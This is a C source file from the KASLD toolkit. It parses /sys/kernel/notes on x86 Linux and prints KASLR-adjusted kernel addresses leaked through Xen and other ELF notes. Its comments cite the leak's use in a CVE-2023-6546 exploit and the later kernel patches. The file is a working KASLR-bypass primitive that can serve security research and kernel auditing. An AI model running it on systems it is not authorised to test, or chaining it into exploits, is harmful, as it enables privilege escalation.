// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Parse ELF notes from /sys/kernel/notes for leaked kernel pointers on
// x86(_64) kernels.
//
// Xen ELF notes on kernels with CONFIG_XEN=y contain KASLR-adjusted virtual
// addresses generated via _ASM_PTR in arch/x86/xen/xen-head.S:
//   - Type 1 (XEN_ELFNOTE_ENTRY): startup_xen virtual address
//   - Type 2 (XEN_ELFNOTE_HYPERCALL_PAGE): hypercall_page virtual address
//   - Type 18 (XEN_ELFNOTE_PHYS32_ENTRY): physical kernel entry offset
//
// Also performs a generic scan of all remaining note descriptors for
// pointer-sized values in the kernel text virtual address range.
//
// # grep hypercall_page /proc/kallsyms | head -n 1
// ffffffffa6316000 T hypercall_page
// $ hexdump -C /sys/kernel/notes | grep '00 60 31 a6' -A 1 -B 1
// 00000180  04 00 00 00 08 00 00 00  02 00 00 00 58 65 6e 00 |............Xen.|
// 00000190 [00 60 31 a6 ff ff ff ff] 04 00 00 00 04 00 00 00 |.`1.............|
// 000001a0  11 00 00 00 58 65 6e 00  01 88 00 00 04 00 00 00 |....Xen.........|
//
// The Xen hypercall_page leak was discovered by Nassim-Asrir (@p1k4l4) and
// used in an exploit for CVE-2023-6546:
// https://github.com/Nassim-Asrir/ZDI-24-020/blob/a267e27f5868a975e767794cf77b3092acff4a26/exploit.c#L421
//
// /sys/kernel/notes was introduced in kernel v2.6.23-rc1~389 on 2007-07-20:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=da1a679cde9b12d6e331f43d2d92a234f2d1f9b0
//
// Xen ELF notes were introduced in kernel v2.6.23-rc1~498^2~25 on 2007-07-19:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=5ead97c84fa7d63a6a7a2f4e9f18f452bd109045
//
// Leak primitive:
//   Data leaked:      kernel text virtual address (startup_xen, hypercall_page)
//   Kernel subsystem: arch/x86/xen — /sys/kernel/notes (ELF notes)
//   Data structure:   Xen ELF notes (XEN_ELFNOTE_ENTRY,
//   XEN_ELFNOTE_HYPERCALL_PAGE) Address type:     virtual (kernel text) Method:
//   exact (ELF note parsing) Patched:          v6.9 (commit aaa8736370db);
//   hardened v6.13 (223abe96ac0d) Status:           fixed in v6.9
//
// Mitigations:
//   Patched in v6.9 (relocations in .notes skipped). Further hardened in
//   v6.13 (place-relative relocations). Requires CONFIG_XEN=y.
//   /sys/kernel/notes is world-readable (0444); no runtime sysctl
//   can restrict access.
//
// Requires:
// - Readable /sys/kernel/notes
// - CONFIG_XEN=y (for Xen-specific notes; generic scan works without it)
//
// Patched in v6.9-rc1~164^2~8 (aaa8736370db) — relocations in .notes section
// are skipped, so values no longer reflect the KASLR-adjusted addresses.
// Further hardened in v6.13-rc1~202^2~2 (223abe96ac0d) — Xen ELF notes use
// place-relative relocations to prevent leaking the KASLR base.
//
// References:
// https://cateee.net/lkddb/web-lkddb/XEN.html
// https://elixir.bootlin.com/linux/v6.7.3/source/arch/x86/xen/xen-head.S#L118
// https://elixir.bootlin.com/linux/v6.7.3/source/arch/x86/platform/pvh/head.S
// https://github.com/Nassim-Asrir/ZDI-24-020/blob/a267e27f5868a975e767794cf77b3092acff4a26/exploit.c#L421
// ---
// <bcoles@gmail.com>

#if !defined(__i386__) && !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define ALIGN4(x) (((x) + 3u) & ~3u)

/* Xen ELF note types (from include/xen/interface/elfnote.h) */
#define XEN_ELFNOTE_ENTRY 1
#define XEN_ELFNOTE_HYPERCALL_PAGE 2
#define XEN_ELFNOTE_PHYS32_ENTRY 18

KASLD_EXPLAIN("On Xen PV and PVH guests, /sys/kernel/notes contains ELF notes "
              "that embed KASLR-adjusted virtual addresses of startup_xen and "
              "the hypercall page. These notes are world-readable and were not "
              "updated after KASLR relocation until v6.9. Parsing the ELF note "
              "structures reveals the kernel text virtual base.");

KASLD_META("method:exact\n"
           "addr:virtual\n"
           "patch:v6.9\n"
           "config:CONFIG_XEN\n");

/* Check if /proc/kallsyms contains xen_elfnote_* global symbols,
 * indicating v6.13+ place-relative encoding where Xen ELF note values
 * are baked-in link-time constants (not KASLR-adjusted).
 *
 * Symbol names are visible regardless of kptr_restrict settings.
 *
 * Returns:  1 = found (place-relative encoding detected)
 *           0 = not found
 *          -1 = error (cannot determine) */
static int has_xen_elfnote_symbols(void) {
  FILE *fp;
  char line[256];

  fp = fopen("/proc/kallsyms", "r");
  if (!fp)
    return -1;

  while (fgets(line, sizeof line, fp)) {
    if (strstr(line, " xen_elfnote_")) {
      fclose(fp);
      return 1;
    }
  }

  fclose(fp);
  return 0;
}

int main(void) {
  int fd;
  uint32_t hdr[3]; /* namesz, descsz, type */
  char buf[512];
  char label[64];
  int found = 0;

  /* Xen notes are collected first, then cross-checked before output */
  unsigned long xen_entry = 0;     /* type 1: startup_xen VA */
  unsigned long xen_hypercall = 0; /* type 2: hypercall_page VA */
  unsigned long xen_phys32 = 0;    /* type 18: physical entry offset */

  printf("[.] checking /sys/kernel/notes ...\n");

  fd = open("/sys/kernel/notes", O_RDONLY);
  if (fd < 0) {
    perror("[-] open(/sys/kernel/notes)");
    return (errno == EACCES || errno == EPERM) ? KASLD_EXIT_NOPERM
                                               : KASLD_EXIT_UNAVAILABLE;
  }

  while (read(fd, hdr, sizeof hdr) == (ssize_t)sizeof hdr) {
    uint32_t namesz = hdr[0];
    uint32_t descsz = hdr[1];
    uint32_t type = hdr[2];

    uint32_t name_aligned = ALIGN4(namesz);
    uint32_t desc_aligned = ALIGN4(descsz);
    uint32_t total = name_aligned + desc_aligned;

    if (total > sizeof buf)
      break;

    if (total > 0 && read(fd, buf, total) != (ssize_t)total)
      break;

    if (namesz == 0 || descsz == 0)
      continue;

    char *name = buf;
    char *desc = buf + name_aligned;

    /* Ensure name is NUL-terminated (namesz includes trailing NUL) */
    name[namesz - 1] = '\0';

    /* --- Xen-specific notes: collect, don't output yet --- */
    if (strcmp(name, "Xen") == 0) {
      if (descsz == sizeof(unsigned long)) {
        unsigned long addr;
        memcpy(&addr, desc, sizeof addr);

        if (type == XEN_ELFNOTE_ENTRY && addr >= KERNEL_BASE_MIN &&
            addr <= KERNEL_BASE_MAX)
          xen_entry = addr;

        if (type == XEN_ELFNOTE_HYPERCALL_PAGE && addr >= KERNEL_BASE_MIN &&
            addr <= KERNEL_BASE_MAX)
          xen_hypercall = addr;

        if (type == XEN_ELFNOTE_PHYS32_ENTRY && addr >= KERNEL_PHYS_MIN &&
            addr <= KERNEL_PHYS_MAX)
          xen_phys32 = addr;
      }

      continue; /* skip generic scan for Xen notes */
    }

    /* --- Generic scan: check pointer-sized descriptors for kernel text
     * pointers. Catches vendor-specific notes (Intel TDX, AMD SEV,
     * Hyper-V, etc.) that may embed handler addresses. --- */
    if (descsz == sizeof(unsigned long)) {
      unsigned long val;
      memcpy(&val, desc, sizeof val);

      if (val >= KERNEL_BASE_MIN && val <= KERNEL_BASE_MAX) {
        printf("[+] found kernel address in %s note (type %u): %lx\n", name,
               type, val);
        snprintf(label, sizeof label, "sysfs-kernel-notes:%.40s", name);
        kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, val, label);
        found++;
      }
    } else if (descsz == 2 * sizeof(unsigned long)) {
      unsigned long vals[2];
      memcpy(vals, desc, sizeof vals);

      for (int i = 0; i < 2; i++) {
        if (vals[i] >= KERNEL_BASE_MIN && vals[i] <= KERNEL_BASE_MAX) {
          printf("[+] found kernel address in %s note (type %u, word %d): "
                 "%lx\n",
                 name, type, i, vals[i]);
          snprintf(label, sizeof label, "sysfs-kernel-notes:%.40s", name);
          kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, vals[i], label);
          found++;
        }
      }
    }
  }

  close(fd);

  /* --- Cross-check Xen notes for stale (unrelocated) values ---
   *
   * Three known states of Xen ELF notes on x86:
   *
   * 1. Pre-v6.9 (unpatched): .notes section has normal relocations.
   *    Values are KASLR-adjusted at boot -> live addresses -> emit.
   *
   * 2. v6.9+ (aaa8736370db): relocations in .notes are skipped.
   *    Values are static link-time addresses -> stale -> discard.
   *    Detected via PHYS32_ENTRY canary: pvh_start_xen sits near
   *    _text in these kernels, so PHYS32 < KERNEL_PHYS_MIN +
   *    KERNEL_ALIGN when no KASLR slide is applied.
   *
   * 3. v6.13+ (223abe96ac0d): place-relative relocations encode
   *    entry points as build-time constants. Values look plausible
   *    but are not KASLR-adjusted -> stale -> discard.
   *    Detected by checking /proc/kallsyms for xen_elfnote_*
   *    global symbols introduced by the place-relative encoding. */
  if (xen_entry || xen_hypercall || xen_phys32) {
    int stale = 0;

    if (xen_phys32 && xen_phys32 < KERNEL_PHYS_MIN + KERNEL_ALIGN) {
      stale = 1;
    } else {
      int ret = has_xen_elfnote_symbols();
      if (ret == 1)
        stale = 1;
      else if (ret < 0 || !xen_phys32)
        stale = 1; /* cannot verify -> discard conservatively */
    }

    if (!stale) {
      if (xen_entry) {
        printf("[+] Xen entry (startup_xen): %lx\n", xen_entry);
        kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, xen_entry,
                     "sysfs-kernel-notes-xen:entry");
        found++;
      }
      if (xen_hypercall) {
        printf("[+] Xen hypercall_page: %lx\n", xen_hypercall);
        kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, xen_hypercall,
                     "sysfs-kernel-notes-xen:hypercall_page");
        found++;
      }
      if (xen_phys32) {
        printf("[+] Xen PHYS32_ENTRY: %lx\n", xen_phys32);
        kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_TEXT, xen_phys32,
                     "sysfs-kernel-notes-xen:phys32_entry");
        found++;
      }
    } else {
      printf("[-] Xen notes appear stale (unrelocated); discarding\n");
    }
  }

  if (!found)
    printf("[-] no kernel addresses found in ELF notes\n");

  // NOTE: On kernels <= 5.x, hypercall_page was in .pushsection .text
  // (at _text + 0x1000), so addr & -KERNEL_ALIGN recovered _text exactly.
  // In 6.x, hypercall_page moved to .pushsection .noinstr.text for
  // instrumentation isolation. The linker places .noinstr.text after the
  // bulk of kernel code, putting hypercall_page millions of bytes past
  // _text. addr & -KERNEL_ALIGN then overshoots by ~16+ MiB.
  // The orchestrator handles this correctly since it does not assume a
  // fixed symbol-to-base offset.

  return 0;
}
